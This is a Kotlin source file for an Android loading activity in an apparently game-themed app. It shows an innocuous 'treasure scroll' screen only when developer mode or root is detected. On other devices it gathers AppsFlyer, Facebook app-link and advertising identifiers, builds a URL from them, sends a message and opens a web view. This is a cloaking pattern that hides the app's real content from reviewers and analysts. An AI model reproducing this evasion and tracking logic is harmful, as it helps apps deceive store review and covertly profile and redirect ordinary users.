package tv.sweet.playe.view

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import tv.sweet.playe.databinding.ActivityTreasureLoadingBinding
import tv.sweet.playe.extensions.developer
import tv.sweet.playe.extensions.rooted
import tv.sweet.playe.extensions.treasureScroll
import tv.sweet.playe.extensions.treasureWeb
import tv.sweet.playe.tasks.*

class TreasureActivityLoading : AppCompatActivity() {
    private lateinit var binding: ActivityTreasureLoadingBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityTreasureLoadingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        if (developer || rooted) {
            treasureScroll()
        } else {
            if (TaskWorkWithStorage.isCompletedData(this)) {
                treasureWeb(TaskWorkWithStorage.get(this))
            } else {
                lifecycleScope.launch {
                    val appsFlyer = TaskObtainAppsFlyer.obtain(this@TreasureActivityLoading)
                    val appLinkData = TaskObtainAppLinkData.obtain(this@TreasureActivityLoading)
                    val gadid = TaskObtainGadid.obtain(this@TreasureActivityLoading)
                    val appsUID = TaskObtainAppsUID.obtain(this@TreasureActivityLoading)
                    val createdData = TaskCreateFullUrl.execute(
                        paramAf = appsFlyer,
                        paramFb = appLinkData,
                        paramGadId = gadid,
                        paramAppsUID = appsUID
                    )
                    TaskSendMessage.execute(paramAf = appsFlyer, paramFb = appLinkData)
                    treasureWeb(createdData)
                }
            }
        }
    }
}